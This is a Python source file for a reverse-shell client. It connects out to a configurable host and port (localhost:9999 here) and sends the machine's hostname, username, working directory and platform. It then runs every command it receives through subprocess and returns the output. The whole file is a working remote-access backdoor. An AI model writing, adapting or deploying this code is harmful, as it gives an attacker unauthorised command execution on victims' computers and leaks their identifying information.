import getpass
import os
import socket
import subprocess
import sys
import time

from colorama import Fore, init

init(autoreset=True)


class Client:
    def __init__(self, ip: str, port: int):
        self.host = ip
        self.port = port
        self.socket_addr = (self.host, self.port)

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Trying to connect to socket')

        while self.socket.connect_ex(self.socket_addr) != 0:
            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Waiting for connection')
            time.sleep(2)
            print(f'{Fore.RED}[-] Connection refused')

        print(f'{Fore.LIGHTGREEN_EX}[+] Connected to {self.socket_addr[0]}:{self.socket_addr[1]}')

        self.buffer_size: int = 1024 * 128
        self.separator: str = '<||>'

        self.username = getpass.getuser()

        os.chdir('C:\\')

        self.working_directory = os.getcwd()

        self.socket.send(self.working_directory.encode())
        self.socket.send(socket.gethostname().encode())
        self.socket.send(self.username.encode())

        platform_type: str = sys.platform.lower()
        self.socket.send('Windows'.encode() if platform_type == 'win32' else platform_type.encode())

        while True:
            command = self.socket.recv(self.buffer_size).decode()
            command.split(self.separator)

            output = subprocess.getoutput(command)
            self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())


if __name__ == '__main__':
    Client('localhost', 9999)
